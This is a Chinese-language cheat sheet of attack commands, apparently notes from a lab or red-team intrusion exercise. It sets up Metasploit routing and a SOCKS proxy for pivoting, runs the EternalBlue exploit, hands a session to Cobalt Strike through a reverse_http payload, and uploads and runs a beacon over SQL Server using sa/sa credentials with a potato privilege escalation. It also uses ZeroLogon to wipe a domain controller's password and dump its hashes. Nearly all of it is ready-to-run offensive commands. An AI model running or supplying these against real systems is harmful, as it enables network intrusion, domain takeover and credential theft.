### 上线msf自动添加路由

```cmd
meterpreter >run post/multi/manage/autoroute
```

### 配置代理

```cmd
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 10800
set VERSION 5
run -j

//使用代理
setg Proxies socks5:127.0.0.1:10800
set ReverseAllowProxy true -->很关键
```

### 永恒之蓝

```cmd
search 17_010
setg Proxies socks5:127.0.0.1:10800
set ReverseAllowProxy true
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.20.7
set payload windows/x64/meterpreter/bind_tcp
run
```

### 转发上线CS

```cmd
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set prependmigrate true
set DisablePayloadHandler true
set LHOST 192.168.111.25
set LPORT 680
set SESSION 1
run
```

### 使用sharpcmdshell

- CS创建windows/beacon_bind_tcp正向监听,生成马用sharpsqltools上传上去

```cmd
SharpSQLTools.exe 10.10.10.18 sa sa master upload C:\\Users\\24937\\Desktop\\beacon.exe C:\\Users\\Public\\beacon.exe
SharpSQLTools.exe 10.10.10.18 sa sa master clr_combine C:\\Users\\Public\\beacon.exe
SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato "C:\\Users\\Public\\beacon.exe"
```

- CS上使用跳板机主动连接

```cmd
connect 10.10.10.18 4567
```

### 使用zerologon清空域控密码

```cmd
search cve-2020-1472
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set rhosts 10.10.10.8
set nbname owa
setg Proxies socks5:127.0.0.1:10800
set ReverseAllowProxy true
run
```

### 使用空ntml(**`owa$`**)上线

```
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set action DUMP_HASHES
set rhosts 10.10.10.8
set nbname owa
setg Proxies socks5:127.0.0.1:10800
set ReverseAllowProxy true
run
```

